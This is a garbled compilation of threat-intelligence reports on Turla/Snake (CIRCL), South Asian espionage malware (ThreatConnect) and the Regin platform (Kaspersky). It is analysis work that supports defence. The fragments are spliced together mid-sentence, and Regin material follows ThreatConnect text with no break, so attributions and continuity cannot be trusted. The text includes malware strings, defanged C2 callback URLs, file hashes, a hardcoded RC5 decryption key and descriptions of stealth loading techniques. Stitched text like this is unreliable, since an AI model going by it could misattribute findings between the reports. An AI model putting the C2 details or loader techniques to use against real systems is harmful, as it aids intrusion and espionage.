        m_send() TASK failed.OBJECT ACK failed.Internal task %d obj %s not equal robj %s... very strange!!!m_recv() OBJECT failed.m_send() OBJECT failed.m_send() WHO failed.AUTH failed.m_recv() AUTH failed.m_send() AUTH failed.m_connect() failed.m_setoptlist() failed.net_password=
        net_user=
        allow=*everyone
        write_peer_nfo=%c%s%c
        frag_no_scrambling=1
        frag_size=32768
        m_create() failed.frag.np
        \\%s\pipe\comnode
        W|2|%s|%d|
        127.0.0.1
        m_send() ZERO failed.(00000001)
        # of Addresses:   1.(00000001)
        # of Names    :   1.(00000001)
</list>


<footer>
12 of 34                                                                                          12/31/2014 09:19 AM
</footer>

<header>
CIRCL » TR-25 Analysis - Turla / Pﬁnet / Snake/ ...                                        http://www.circl.lu/pub/tr-25/
</header>

           1.Arg file failed.T|-1|%d|%d|
        AS_USER:LogonUser():%d
        AS_USER:DuplicateTokenEx():%d
        explorer.exe
        AS_CUR_USER:OpenProcessToken():%d
        AS_CUR_USER:DuplicateTokenEx():%d
        CrPr() wait timeout %d msec exceeded: %d
        CrPr() WaitForSingleObject() error: %d
        CrPr(),WL(),AU():%d
        CopyFile(%s, %s):%d
        Memory allocation error.\\.\IdeDrive1\\Plugins\
        Can't create file '%s', error %d =((
        Create plugin '%s' OK.Create plugin '%s' failed.Write error, %d.PLUGINS
        Find existing record.not_started|%d
        Config update success.enable%s
        Config record error: %s = %s.Plugin not found in config.Plugin already loaded.ModuleStart
        can`t find entry point.loadlibrary() failed.Plugin start failed, %d
        try to run dll with user priv.can`t get characs.Plugin not PE format.Plugin start success.Plugin start failed.disable%s
        removed%s
        Plugin not loaded.Plugin deleted.Plugin delete failed, %d.Plugin terminated.Plugin terminate failed, %d.ModuleStop
        Plugin dll stop success.Plugin dll stop failed.Plugin freelib success.Plugin freelib failed, %d.Internal command not support =((
        %u|1|%s
        G|0|%d|%d|
        W|0|%s|%d|
        A|0|%s|%d|
        %u|%s|%s|%s|%s
        %u|%s|%s|%s|%s|%d|%s|%s
        %u|%s|%s|%s|%s|%d
        W|1|%s|%d|
        A|1|%s|%d|
        %s:%d
        \\%s\pipe\%s
        m_create() failed.net_user=%s
        net_password=%s
        m_setoptlist() failed.m_connect() failed.m_send() AUTH failed.m_recv() AUTH failed.AUTH failed.m_send() WHO failed.m_send() OBJECT failed.m_recv() OBJECT failed.Trans task %d for obj %s ACTIVE fail robj=%s
        OBJECT ACK failed.m_send() TASK failed.m_recv() WIN RESULT failed.m_recv() ACT RESULT failed.m_send() ACT RESULT failed.The analysis of this kernel module by deresz and tecamac is very detailed.We advise the interested reader to work
        through their document to understand all the details.In the following example, they decrypt (XOR) the strings
        used to assemble the locations of where to drop the other components of the malware to.0x4E415341 is ASCII for ‘NASA’.That’s how they
        decrypt and assemble the string IdeDrive, appending a ‘1’ in the next step and using if for creating the destination.?SCryptoapi_d ; "\\??SInetpub_dll ; "\\??\\%s\\inetpub.dll"
        .text:0001E23D                lea     eax, [ebp+inetpub.dll]
        .text:0001E243                push    eax              ; char *
        .text:0001E244                call    sprintf
        [...]
</table>
</section>

<section>
        <heading>To describe</heading>
        \Registry\Machine\usblink_export

        HKEY_LOCAL_MACHINE\usblink_export

        (also LEGACY_usblink and usblink?)<code>
        1char __stdcall check_proces_and_activate_wininet(int a1, int a2, int a3)
        2{
        3[...]
        4     if ( match_list_of_programs_by_name(&program_name) )
        5        pulse_event_wininet_activate();
        6[...]
        7}
</code>

        The event \BaseNamedObjects\wininet_activate is then created and pulsed.Microsoft mentions
        in the documentation of the PulseEvent function 7:

             Note This function is unreliable and should not be used.It exists mainly for backward compatibility.For


<footer>
25 of 34                                                                                                     12/31/2014 09:19 AM
</footer>

<header>
CIRCL » TR-25 Analysis - Turla / Pﬁnet / Snake/ ...                                                          http://www.circl.lu/pub/tr-25/
</header>

               more information, see Remarks.So it could well be that this part is old code and was forgotten to be removed.</section>

<section>
        <heading>Applying work-around for bugs related to AMD Athlon and AGP graphics port</heading>

        From Microsoft Support article AGP program may hang when using page size extension on Athlon processor 8 the
        following excerpt:

               The following workaround for this issue prevents Memory Manager from using the processor’s Page Size
               Extension feature and may aﬀect the performance of some programs, depending on the paging behavior.This registry value also limits non-paged pool to a maximum of 128 megabytes (MB) instead of 256 MB.The internal name of this
        module, carbon_system.dll, supports this observation.The ﬁrst two are:

             get_initialization_parameters_create_GUID_and_check_Packet_Capturing()
             periodic_free_space_check_and_write_log()

        These serve the purpose of initializing the environment for the malware and running maintenance and log tasks.CUSTOM_ERROR_03   =   21590003h         ; BROKEN_PIPE?CUSTOM_ERROR_04   =   21590004h
           CUSTOM_ERROR_05   =   21590005h
           CUSTOM_ERROR_06   =   21590006h
           CUSTOM_ERROR_07   =   21590007h
           CUSTOM_ERROR_08   =   21590008h
           CUSTOM_ERROR_09   =   21590009h
           CUSTOM_ERROR_0A   =   2159000Ah
           CUSTOM_ERROR_0B   =   2159000Bh         ; INVALID_USER_BUFFER?CUSTOM_ERROR_0D   =   2159000Dh
           CUSTOM_ERROR_64   =   21590064h
           CUSTOM_ERROR_65   =   21590065h
           CUSTOM_ERROR_66   =   21590066h
           CUSTOM_ERROR_67   =   21590067h
           CUSTOM_ERROR_68   =   21590068h
           CUSTOM_ERROR_69   =   21590069h
           CUSTOM_ERROR_C9   =   215900C9h         ; NO_VALID_ADDR?CUSTOM_ERROR_CA   =   215900CAh         ; NO_VALID_PORT?When a successful handle is returned, a ﬁle is being downloaded and stored in the virtual ﬁle system.What follows is a GET in HTTP/1.0 on
        default.asp?act=%u&id=%u&item=%u&event_id=%u&cln=%u&flt=%u&serv=%s&t=%ld&mode=query&lang=en&date=%s


        This code is part of sub_20009871, which continues to serve the frag.np/frag.tcp part.In sub_200075C0 another POST in HTTP/1.0 to
        default.asp?act=%u&id=%u&item=%u&event_id=%u&cln=%u&flt=%u&serv=%s&t=%ld&mode=query&lang=en&date=%s


        follows.The purpose of the two functions is not clear, yet.Arg file failed.Update failed =(( Can`t create file.can`t get characs.\n
        Internal command not support =((\n
        L|-1|can`t get characs %s|\n
</section>

<section>
        <heading>Recommendations</heading>
             CIRCL recommends to review the IOCs of this report and compare them with servers in the infrastructure of
             your organization which produce log ﬁles including proxies, A/V and system logs.As this family of malware
             might be diﬀicult to detect from a network perspective, we recommend to perform check of the indicators at
             the system level.</section>

<section>
        <heading>Classiﬁcation of this document</heading>
        TLP:WHITE information may be distributed without restriction, subject to copyright controls.Content from this website is classiﬁed as TLP:WHITE information may be distributed without restriction, subject to
        copyright controls.Copyright 2008 - 2014 CIRCL Computer Incident Response Center Luxembourg (smile gie), national CERT.PGP signature of this page and How to Verify Integrity of CIRCL Web Pages
</section>

<figure></figure>

<footer>
34 of 34                                                                                                  12/31/2014 09:19 AM
</footer>

</doc></section>
<section>
                <heading>Summary:</heading>

                The global proliferation of cyber espionage may be serving as a catalyst for regional entities within South Asia to adopt their own cyber espionage capabilities.Irrespective of the threats sophistication or motivation, South Asian cyber threats are likely emulating behaviors of larger regional powers to strategically
                influence national, organizational or individual objectives.The ThreatConnect Intelligence Research Team (TCIRT) has identified an example of South Asian cyber espionage that is likely transcending sectors and
                regional geographic boundaries.Analyses of multiple customized malware binaries hosted within a small U.S. subnet have likely been used to target Indian
                military or government entities.The malware contains specific artifacts that point to a commercial Pakistani entity.Although the TCIRT cannot conclusively
                confirm direct involvement, several hypotheses have been developed which may account for the malware and observed activity.All of the following
                information and threat indicators are available within ThreatConnect.com and have been shared with the ThreatConnect community.Operational Caveat: The ThreatConnect Intelligence Research Team has contacted the affected service providers and notified them of the activity observed.Details associated with this threat have been shared with the ThreatConnect Community within Incident “20130731A: South Asia Cyber
      Espionage Heats Up”.</section>
<section>
<heading>It Takes Two to Tango:</heading>

Globalization has woven the Internet into a fabric that interlaces practically every aspect of modern living.Throughout the years, as evidenced in countless
media reports, world superpowers have recognized and utilized the Internet as a powerful source for intelligence collection, and on occasion we have been
offered glimpses as to how they are leveraging cyber espionage in support of their national diplomatic, military or economic objectives.Similar to a younger sibling looking up to a big brother, regional and middle powers within South Asia are seeking to leverage global cyber espionage in an
effort to achieve parity with nation states who have far-reaching diplomatic power, modernized militaries and influential economies.Ultimately, these
emergent economies are likely seeking to hasten their path to success in fulfilling national objectives via the “short-cut” that cyber espionage offers.Individual countries within the Indo-Pak subcontinent are increasingly involved in cyber attacks and targeted espionage campaigns.South Asia is no stranger
to deeply rooted conventional conflict which is most often a strong harbinger of cyber conflict.On March 17th, 2013, the Norwegian-based, global
telecommunications provider Telenor reported a network breach from an unknown sophisticated threat actor that targeted Telenor executives using custom
malware implants.The attackers were responsible for pilfering email archives and documents from Telenor executives, compromising their intellectual
property and business operations.Nearly two months later, the Norwegian antivirus and security firm Norman issued an investigative analysis report titled Operation Hangover: Unveiling an
Indian Cyberattack Infrastructure that detailed cyber espionage activities associated with the Telenor compromise.They noted similar targeting campaigns that
were observed exploiting numerous industries and organizations within Norway, Pakistan, US, Iran, China, Taiwan, Thailand, Jordan, Indonesia, UK,
Germany, Austria, Poland, and Romania.Norman speculated that a group associated with an identified private Indian information security company likely
carried out the espionage campaigns.Norman’s 43 page assessment concluded that a sophisticated Indian exploitation team was indeed responsible for the network breach and Telenor compromise.The TCIRT believes that a possible theory that supports an Indian attack scenario is that the Telenor subsidiary, Telenor Pakistan, is a strategic
communications infrastructure provider.Telenor Pakistan provides voice, data content and mobile communications to more than 3,500 cities and towns within
Pakistan.Persistent remote Indian access to a strategic communications service provider, such as Telenor Pakistan, would certainly yield unparalleled signals
intelligence collection capability.The information obtained would be of strategic value to Indian intelligence services.</section>
<section>
<heading>New Findings:</heading>

In light of the recent revelation of Indian involvement in the targeting of Telenor, it is critical for us to consider the borderless nature of cyber espionage and to
understand how regional cyber conflicts can spill across geographies and affect critical commercial business operations.As part of an ongoing TCIRT focused research and analysis, we have found custom malware being used operationally “in the wild” that may be targeting
Indian military and government related entities, as well as other unidentified South Asian targets.This activity is possibly linked to an identified Pakistani
information security company.</section>
<section>
<heading>The Malware:</heading>
In late May 2013, TCIRT identified a malicious file hosted at [http://]199.91.173[.]43/new_salary/salary_revision.scr (Kansas City, Missouri).This file was a
self-extracting (SFX) archive that, when executed, presents the target victim with a 12 page decoy PDF document.The document was an official Government
of India (GoI), Ministry of Defense (MoD) pension memorandum of record.It is highly likely that the malware and decoy document would be tailored for and
delivered to specific recipients associated with the GoI or MoD.<figure></figure>


The SFX dropper contained multiple custom executable files, as well as legitimate Microsoft Visual C++ Runtime Library files, which are part of the codebase
used to develop and required to execute the backdoor code.The malware also uses the legitimate cURL library in the form of libcurld.dll.The open-source
cURL library is a multiprotocol transfer library used primarily for FTP and HTTP transactions.<figure></figure>
The main backdoor component is found in winsocks.exe.The files ExtractPDF.exe and Start.exe simply serve as utilities to open the PDF file and execute the
winsocks.exe backdoor component.When executed, the winsocks.exe backdoor requests a PHP update callback at
[http://]199.91.173[.]43/fetch_updates_8765.php?compname=<COMPUTERNAME>.<figure></figure>


A version.txt file is also requested by the malware.This file contained a version number 1.0, likely denoting the version of the backdoor and/or the command
and control (C2) backend.The winsocks.exe backdoor also contains hardcoded strings of Office file extensions, telegraphing the likely intention of the
attackers in collecting and exfiltrating office automated documents from victim networks.Another variant of this backdoor uses the same winsocks.exe with a different dropping mechanism and was found at
[http://]199.91.173[.]43/Classified_Video.flv.scr and [http://]199.91.173[.]43/sarbajit_leaked_video.wmv.scr.Both of these .scr files have the same MD5.In this SFX, Windows batch files had replaced the ExtractPDF.exe and Start.exe with a decoy Flash video (FLV) file was used in place of the decoy PDF.An
FLV file is an interesting choice of decoy document since it is not a standard video format for media players.The dynamic DNS domains windowsupdate.no-
ip[.]biz and masalavideos.no-ip[.]biz were also being mapped to IP Address 199.91.173.43 as of late May 2013, when the video themed malicious attachments
were being operationalized.When opened the flash video simply displays a couple kissing passionately.Implementing the use of free dynamic DNS services,
such as those of NO-IP within targeting and exploitation phases of attack, are very common techniques used by a variety sophisticated threat groups.<figure></figure>

The file sarbajit_leaked_video.wmv.scr contains a compile time of May 28, 2013 19:53:26 UTC.The filename is possibly a misspelled reference to Sarabjit
Singh, an Indian national who was arrested and convicted of terrorism and espionage charges in 1991 by Pakistani authorities.After a protracted 22 year legal
battle, Sarabjit Singh would become the victim of a severe beating by Pakistani prisoners and would later die of his injuries in a Lahore hospital on May 2,
2013.News of the attack and subsequent death of Sarabjit Singh incited protests in India that increased regional Indo-Pakistani tensions and served as a
catalyst for bilateral governmental negotiations between Delhi and Islamabad.This file was created 26 days after the death of Sarabjit Singh, and would be of
relevance to targeted Indian entities, much like the official Government of India (GoI), Ministry of Defense (MoD) pension memorandum.</section>
<section>
<heading>Significant Malware Artifacts:</heading>
Operational Caveat: It is important to note that there are information gaps which diminish our ability to establish a definitive explanation for the malicious
activity and identify the responsible entities behind the authorship and use of the identified malware.Below the TCIRT simply highlights the facts associated
with specific artifacts identified within the malware.Most of the dropped malware binaries contained a debug string that sheds light on the possible developers and operators of the malware.<figure></figure>

The significance of the username Tranchulas within the debug path of the winsocks.exe binary is that Tranchulas is a Pakistani information security consulting
company with offices in the United Kingdom, United States, and Pakistan.The CEO of Tranchulas is Zubair Khan, a Pakistani national and information
security executive who has “been researching mainly on [sic] cyber warfare”.Khan also likely maintains a close relationship to the Pakistani government.According to this online biography, he is responsible for the penetration testing of Pakistani homeland security solutions and has consulted for the Pakistani
National Database and Registration Authority (NADRA).<figure></figure>


Proximity to such sensitive security programs suggest a certain level of trust on behalf of the Pakistani government, and may indicate that official Pakistani
entities could have access to Tranchulas technical support for various security projects or programs.An ironic, yet noteworthy observation is that the
Tranchulas website boasts Telenor as a client.<figure></figure>

Tranchulas also serves as an official sponsor for the Pakistan CERT in addition to maintaining the official Pakistan CERT website (cert.org.pk).<figure></figure>

On July 2, 2013 a similar file windefender.exe (MD5: a21f2cb65a3467925c1615794cce7581) was identified containing a strong association to Tranchulas.<figure></figure>


A second host within the same 199.91.173[.]40/29 subnet was also identified hosting similar zipped malware at
[http://]199.91.173[.]45/OBL_Leaked_Report.zip and [http://]199.91.173[.]45/Naxalites_Funded_By_Pakistan.zip.The OBL_Leaked_Report.zip contained a
.scr file that drops a decoy document pertaining to the alleged incompetence of Pakistani authorities in locating Osama Bin Laden (OBL).<figure></figure>

This OBL malware drops a windefender.exe backdoor component (MD5: 35663e66d02e889d35aa5608c61795eb) In this case, the debug string is:

C:\Users\Cert-India\Documents\Visual Studio 2008\Projects\ufile\Release\ufile.pdb.The binaries that contain the “umairaziz27ʺ″ and “Cert-India” debug strings are designed to call back to [http://]199.91.173[.]45/fetch_updates_8765_tb.php?compname=<COMPUTERNAME> and [http://]199.91.173[.]45/is_array.php?compname=<COMPUTERNAME>.Meanwhile, the
Naxalites_Funded_By_Pakistan.scr file drops a slightly different malware component and an alternate decoy document.<figure></figure>


The dropped implant, showppt.scr (MD5: 165ac370b54e664812e4c15b2396ccd6), is a downloader that connects to [http://]199.91.173[.]45/ and downloads
both legitimate library files and malicious second stage binaries.Hypothesis 2: Tranchulas developed and sold the malicious binaries to an unidentified customer, where they were later operationalized by an unidentified
              entity.Hypothesis 3: An unidentified third party unaffiliated with Tranchulas developed the malware, deliberately including misleading software artifacts as a direct
              effort to create speculation and shift blame toward Tranchulas.Hypothesis 4: A rogue Tranchulas employee used company resources without company knowledge to develop the malware, where an unknown operator later
              used it offensively.Hypothesis 5: Indian entities actively sought and utilized the services of Pakistan based information security company, Tranchulas, for an officially sanctioned
              and authorized penetration test.The malicious implants were subsequently developed and used as part of official Tranchulas service offerings, while the files
              and infrastructure used for the audit were submitted to publicly available malware analysis services.Hypothesis 6: An unidentified Indian entity developed and used this malware as a realistic simulated exercise to perform penetration testing and evaluate their
              readiness in the event of actual Pakistani affiliated offensive network operations.The files and infrastructure used for the simulation were submitted to publicly
              available malware analysis services.</section>
<section>
              <heading>Conclusion:</heading>

              Considering the long-standing regional tensions between India and Pakistan, South Asia serves as a likely flashpoint for conventional conflict to carry over and
              play out within cyberspace.Public and private sectors alike should begin to increase their awareness of emerging cyber threats from the lesser-known middle
              powers.Regardless of sophistication, these threats may support future belligerents who have or will eventually possess the capability and intent to disrupt
              critical business operations.Details associated with this threat have been shared with the ThreatConnect Community within Incident “20130731A: South Asia Cyber Espionage Heats
              Up”.If you or your organization is interested in obtaining crowd-sourced threat intelligence that increases your awareness of emerging cyber threats, please
              register at ThreatConnect.com and join our community.</section>
<section>          
              Tags: Cyber Espionage, India, Pakistan, South Asia, Telenor


        Previous article                                                                Next article

No Comments


 Search the Site...Although he
couldn’t share a sample, the researcher mentioned ‘Regin’, a type of malware attack that is now dreaded
by security administrators in many government agencies around the world.For the past three years we have been tracking this most elusive malware all around the world.From time
to time samples would appear on various multi-scanner services, but they were all unrelated to each other,
cryptic in functionality, and lacking in context.It is unknown exactly when the first samples of Regin appeared in the wild.Some of them have timestamps
dating back to 2003.This is discussed in detail in the GSM attacks section, below.Perhaps one of the most well-known victims of Regin was Jean Jacques Quisquater (https://en.wikipedia.org/
wiki/Jean-Jacques_Quisquater), a well-known Belgian cryptographer.In February 2014, Quisquater announced
he was the victim of a sophisticated cyber-intrusion incident.We were able to obtain samples from the Quisquater
case and confirm they belong to the Regin platform.Another victim of Regin was a computer we call the ‘Magnet of Threats’.The computer belongs to a certain
research institution and, besides Regin, it has been attacked by Animal Farm, Itaduke, Mask/Careto, Turla,
and some other advanced threats that do not have public names, all co-existing happily on the same computer
at some point.</section>

<header>Initial compromise and lateral movement</header>
<section>The exact method used for the initial compromise remains a mystery, although several theories exist, including
use of man-in-the-middle attacks with browser zero-day exploits.For some of the victims we observed tools and
modules designed for lateral movement.So far we have not encountered any exploits.The replication modules
are copied to remote computers using Windows administrative shares and then executed.Obviously this tech-
nique requires administrative privileges inside the victim’s network.In several cases the infected machines
were also Windows domain controllers.Targeting of system administrators via web-based exploits is a simple
way of achieving immediate administrative access to the entire network.</section>



<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
4</noncontent>



<header>The Regin platform</header>
<section>
Although some private research groups refer to it as the ‘Regin malware’, it is not entirely accurate to use
the term malware in this case.In essence, Regin is a cyberattack platform, which the attackers deploy in victim
networks for total remote control at all levels.The platform is extremely modular in nature and has multiple stages.These are the easiest to notice
because they are the only executables that exist directly on the victim’s computer.These samples use an odd technique to load the next stages, which until recently was unique to Regin.Inter-
estingly, in mid-2012, the ZeroAccess gang implemented a very similar loading mechanism, which possibly
suggests it learned about Regin and its unique features.(See http://www.symantec.com/connect/blogs/
trojanzeroaccessc-hidden-ntfs-ea).The particular feature used (or abused) by Regin to hide its next stages is called NTFS Extended Attributes
(EA).Originally, these were implemented in Windows NT for compatibility with OS/2 applications; however, they
made their way into later versions of Windows, namely 2000, XP and Vista.The malware hides its modules in
NTFS EAs, splitting large files into several blocks of limited size.These are dynamically joined, decrypted and
executed in memory.Most of the stage 1 samples we have seen appear to have been built on top of other source code projects,
which are ‘piggybacked’; for instance, the Ser8UART project:
http://www.mirrorservice.org/sites/downloads.sourceforge.net/s/se/ser8uart-driver/ser8uart-driver/
Ser8UART%20%201.1.2.1/.For instance, the Regin loader with md5 01c2f321b6bfdb9473c079b0797567ba was built on top of the
Ser8UART source code.A careful examination however spots the encrypted configuration block at offset 0x5600.We can assume the attackers take various low-level open-source projects or Windows DDK source codes and
merge them together with their malicious loader.Hence, each stage 1 loader looks very different from others,
as it contains random useless code from various other programs.This technique makes it more difficult to build
reliable detection for the loaders.Despite the differences, all stage 1 samples are similar in functionality.They contain an encrypted config block
that points to the next stages:

<figure></figure>


Once decrypted, the block contains several folder names and registry key names:




<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
6</noncontent>

<figure></figure>


In the example above, the stage 1 tries to load a second stage from the extended attributes of the system direc-
tory specified in the configuration block (in our case, the WINDOWS folder).It also tries to read additional data
from the EAs of the second directory (in our case, the WINDOWS\fonts directory).The second attribute value
is optional and may have been used to overcome size limitations.If the first EA data block is missing, the module also tries to read the complete body of the 2nd stage from
a registry value using the key and value names from the configuration block.The body of the second stage is encrypted with one of two algorithms that are simple variations of XOR, and
is supposed to be a PE file.The first stage loads that file in memory and calls its entry point function.The 64-bit variant works in a slightly different way.Instead of storing the 2nd stage in the registry or extended
attributes, the attackers preferred to store it after the end of the last partition on disk.Known filenames for the 64-bit stage 1:
    •	 system32\wsharp.dll – detected on a victim machine in Germany
    •	 system32\wshnetc.dll – detected on a victim machine in Belgium

<figure></figure>                     <figure></figure>
All the stage 1 modules for 64-bit systems were signed with fake digital certificates.The two fake certificates we
identified are supposed to belong to Microsoft Corporation and Broadcom Corporation.During the infection phase,
the attackers inject a trusted CA in the certificates chain, which instructs the system to trust their signatures.<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
                                                                                                                    7</noncontent>



Here is what the hard drive of a 64-bit system infected with Regin looks like:

<figure></figure>


Interestingly, while the 32-bit Regin stage 1 runs in kernel mode, on 64-bit systems the attacker code starts in user
mode.This is perhaps due to the fact that it is more difficult to run kernel mode on modern Windows 64-bit systems.</section>
<section>
<heading>Stage 2 – loader – 32-bit</heading>
<table>
 Known MD5s:
 18d4898d82fcb290dfed2a9f70d66833
 b9e4f9d32ce59e7c4daf6b237c330e25
</table>
The second stage for 32-bit systems is implemented as a driver module.It has a configuration block encrypted in
a similar way to the first stage module.The configuration block contains the names of two system directories that
hold the encrypted third stage in their extended attributes.It also has the name of a registry value that may hold
the body of the third stage in case the EAs are missing (for computers with a FAT/FAT32-formatted system disk).Once the encrypted third stage is read from the registry or NTFS EAs, it is decrypted using the RC5 algorithm
and a fixed 16-byte key that is hardcoded in the second stage.Then, it is decompressed using the NRV2e algo-
rithm from the open-source UCL library.The second stage module loads the resulting binary in memory, vali-
dates that it is a valid PE file, and calls its entry point in a system thread.The second stage also creates a marker file that can be used to identify the infected machine.Known filenames
for this marker are:
   •	 %SYSTEMROOT%\system32\nsreg1.dat
   •	 %SYSTEMROOT%\system32\bssec3.dat
   •	 %SYSTEMROOT%\system32\msrdc64.dat
These files have their timestamp set to the timestamp of the system file ‘%SYSTEMROOT%\system32\lsass.exe’




<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
8</noncontent>



The second stage has additional code for removing the startup code of Regin if signaled by the third stage.Its
configuration data contains the locations of the first three stages, including registry keys, names of the directo-
ries that hold the encrypted EAs, and the location of the initial driver.Essentially, the second stage can remove all the Regin stages from the system, effectively cleaning the machine
and leaving only the encrypted VFS behind.<figure></figure>

                                <caption>Decrypted configuration block of the second stage</caption>

</section>
<section>
<heading>Stage 2 – loader – 64-bit</heading>
<table>
 Known MD5:
 d446b1ed24dad48311f287f3c65aeb80
</table>
The 64-bit version of the second stage loader is a PE DLL module, since the 64-bit bootstrap chain operates
in user mode.Just like the first stage, it loads the encrypted body of the next stage from the end of the physical disk and
decrypts it with a hardcoded RC5 key, then decompresses it using the nrv2 algorithm from the UCL library.After decryption and decompression, the code checks if the next stage is a Windows PE DLL module, and if it is,
it loads and executes it.</section>
<section>
<heading>Stage 3 – 32-bit – kernel mode manager “VMEM.sys”</heading>
<table>
 Known MD5s:
 8486ec3112e322f9f468bdea3005d7b5
 da03648948475b2d0e3e2345d7a9bbbb
</table>
On 32-bit systems, the third stage is implemented as a driver module and provides the basic functionality of
the malicious framework.It is responsible for operating the encrypted virtual file system and loading additional
plugins, and also provides several built-in plugins for the entire framework.The module initializes the framework, sets up the plugin system and starts the actual work cycle of the malware.It also passes execution to the plugin id 50221 that is loaded from the VFS.Stage 2 loads the dispatcher directly from the disk and runs it.</section>
<section>
<heading>Stage 4 (32-bit) / 3 (64-bit) – dispatcher module, ‘disp.dll’</heading>
32-bit
<table>
 Known MD5s:
 1e4076caa08e41a5befc52efd74819ea
 68297fde98e9c0c29cecc0ebf38bde95
 6cf5dc32e1f6959e7354e85101ec219a
 885dcd517faf9fac655b8da66315462d
 a1d727340158ec0af81a845abd3963c1
</table>
64-bit
<table>
 Known MD5:
 de3547375fbf5f4cb4b14d53f413c503
</table>
The dispatcher library is the user-mode core of the framework.It is loaded directly as the third stage of the 64-bit
bootstrap process, or extracted and loaded from the VFS as module 50221 as the fourth stage on 32-bit systems.In essence, the dispatcher is the brain that runs the entire platform.</section>
<section>
<heading>Stage 4 – Virtual File Systems (32/64-bit)</heading>
The most interesting code from the Regin platform is stored in encrypted file storages, known as Virtual File
Systems (VFSes).During our analysis we were able to obtain 24 VFSes from multiple victims around the world.Generally, these
have random names and can be located in several places in the infected system:
<table>
 Folder on disk                                  File name                          Description
 C:\Windows\System32\config\                     SystemAudit.Evt, SystemLog.The VFS files start with a header
that provides basic information required to operate the file system.The header is followed by the bitmap of used/
free sectors and then by the file table.<table>
 00                   Offset of the next sector
 04                   (Sector size)*byte of file data
An example:
</table>
   •	 File record at offset 0x122, file ID 50221, offset of the first sector 0x7B13
   •	 Sector at 0x7B13, next sector at 0x7D13
   •	 Sector at 0x7D13, next sector at 0x7F13,
   •	 Sector at 0x7F13, next sector at 0x8113, etc.<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
12</noncontent>

<figure></figure>


                                         <caption>Example of Regin VFS parsing</caption>
Although the structures of the file system are unencrypted, the file entries are encrypted.The encryption algo-
rithm used is RC5, and many records are also compressed using the nrv2e algorithm from the UCL library.UCL
is an open source implementation of the proprietary NRV (‘Not Really Vanished’) compression algorithm, and
was originally used by the UPX tool.The reason why the attackers chose UCL is simple: it’s small, compact and
requires little to no additional memory for decompression.Each VFS we encountered was encrypted with a 16 bytes key, which can vary from victim to victim.Based on
our experience, most files were however encrypted with the same key, {73 23 1F 43 93 E1 9F 2F 99 0C 17 81
5C FF B4 01} stored in the dispatcher module or VMEM.sys kernel core.<figure></figure>
                         <caption>VFS RC5 decryption key inside the dispatcher module (disp.dll)</caption>
In all, we observed about a dozen different VFS keys.The following plugins were observed inside the VFSes we collected.These are all identified by a 16-bit number.The plugins are referenced by these numbers; they are like filenames on a normal file system and allow the
dispatcher to easily load or reference them.The binary modules are referenced by these numbers as plugin identifiers and usually have similar internal DLL
names; e.g., the plugin with ID ‘50121’ will have the internal name ‘50121.dll’ in its export table.Compressed
binary modules are accompanied by binary files with the same ID.These files contain the size of the decom-
pressed module and are not included in the description.50049              Log of GSM base station commands.Very rare, most interesting
 50079              Location of a temporary file
 50121              Drive names
 50139              Event log provider names
 50181              Data used by network transport plugins
 50185              Plugin configuration
 50227              Plugin configuration
 50233              Process file name list (Explorer.exe, VMWareService.exe, Update.exe, Msiexec.exe,
                    MailService.exe, etc.)For example, only some of the
VFSes we have seen had lateral movement modules, designed for infecting other computers in the network.<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
16</noncontent>


</section>
<header>Unusual modules and artifacts</header>
<section>
In this section we describe some of the most interesting findings about Regin.</section>
<section>
<heading>Artifacts</heading>
With high-end APT groups such as the one behind Regin, mistakes are very rare.Nevertheless, they do happen.Some of the VFSes we analyzed contain words that appear to be the respective codenames of the modules
deployed on the victim:
   •	 legspinv2.6 and LEGSPINv2.6
   •	 WILLISCHECKv2.0
   •	 HOPSCOTCH
Another module we found, which is a plugin type 55001.0, references U_STARBUCKS:

<figure></figure>


Finally, the word ‘shit’ appears in many places throughout the code and modules.<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
                                            17</noncontent>


<figure></figure>
<figure></figure>
</section>
<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
18</noncontent>


<section>
<heading>GSM targeting</heading>
The most interesting aspect we have found so far regarding Regin relates to an infection of a large GSM operator.One VFS encrypted entry we located had internal id 50049.2, and appears to be an activity log on a GSM Base
Station Controller.<figure></figure>

                         <caption>From https://en.wikipedia.org/wiki/Base_station_subsystem</caption>
According to the GSM documentation (http://www.telecomabc.com/b/bsc.html): ‘The Base Station Controller
(BSC) is in control of and supervises a number of Base Transceiver Stations (BTS).The BSC is responsible for
the allocation of radio resources to a mobile call and for the handovers that are made between base stations
under his control.Other handovers are under the control of the MSC.’
Here’s a look at the decoded Regin GSM activity log:

<figure></figure>


<noncontent>TLP: GREEN	Contact: intelreports@kaspersky.com
                                                                                                            19</noncontent>



This log is about 70KB in size and contains hundreds of entries like the ones above.It also includes timestamps
that indicate exactly when the command was executed.<figure></figure>

The entries in the log appear to contain Ericsson OSS MML (Man-Machine Language as defined by ITU-T)
commands (see https://en.wikipedia.org/wiki/Operations_support_system).The log seems to contain not only the executed commands but also usernames and passwords of some engi-
neering accounts:
     sed[snip]:Alla[snip]
     hed[snip]:Bag[snip]
     oss:New[snip]
     administrator:Adm[snip]
</list>
In total, the log indicates that commands were executed on 136 different cells.Some of the cell names include
‘prn021a, gzn010a, wdk004, kbl027a, etc...’.The command log we obtained covers a period of about one
month, from April 25, 2008 through May 27, 2008.It is unknown why the commands stopped in May 2008
though; perhaps the infection was removed or the attackers achieved their objective and moved on.Another
explanation is that the attackers improved or changed the malware to stop saving logs locally and that is why
only some older logs were discovered.</section>

<header>Communication and C&C</header>
<section>
The C&C mechanism implemented in Regin is extremely sophisticated and relies on communication drones
deployed by the attackers throughout the victim networks.Most victims communicate with another machine
in their own internal network through various protocols as specified in the config file.These include HTTP
and Windows network pipes.The purpose of such a complex infrastructure is to achieve two goals: (i) to give
attackers access deep into the network, potentially bypassing air gaps; and (ii) to restrict as much as possible
the traffic to the C&C.One of these routes
reaches out to the ‘external’ C&C server at 203.199.89.80.The numbers right after the ‘transport’ indicate the plugin that handles the communication.These are in our case:
   •	 27 - ICMP network listener using raw sockets
   •	 50035 - Winsock-based network transport
   •	 50037 - Network transport over HTTP
   •	 50051 - Network transport over HTTPS
   •	 50271 - Network transport over SMB (named pipes)
The machines located on the border of the network act as routers, effectively connecting victims from inside
